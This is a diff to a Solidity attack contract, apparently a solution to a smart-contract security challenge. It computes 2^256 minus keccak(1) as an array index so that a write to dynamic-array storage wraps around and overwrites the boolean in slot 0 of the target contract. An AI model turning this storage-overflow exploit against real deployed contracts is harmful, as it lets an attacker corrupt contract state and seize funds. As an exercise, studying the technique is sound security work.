@@ -1,11 +1,11 @@
 pragma solidity ^0.4.21;
 
-import "./IsItOver.sol";
+import "./Over.sol";
 
 
 contract IsItOverAttack {
     IsItOver over;
-
+    //The contract has 32 slots, there is the boolean variable stored in slot 0.
 
     constructor(address _over) public{
         over = IsItOver(_over);
@@ -13,12 +13,9 @@ contract IsItOverAttack {
 
     function attackOver() public
     {   
-        uint256 base_ptr;
-        assembly {
-            base_ptr := mload(0x40)
-        }
-        base_ptr = base_ptr + (base_ptr * 32) + 32;
-        over.setKeyAndValue(base_ptr,10000);
+        //The goal to this attack is to change the slot 0 value of the boolean, for this we need to overflow the storage slot
+        // 2^256 - keccak(1)
+        uint attackIndex = 2**256 - 90743482286830539503240959006302832933333810038750515972785732718729991261126;
+        over.setKeyAndValue(attackIndex,1);
     }
-    
 }
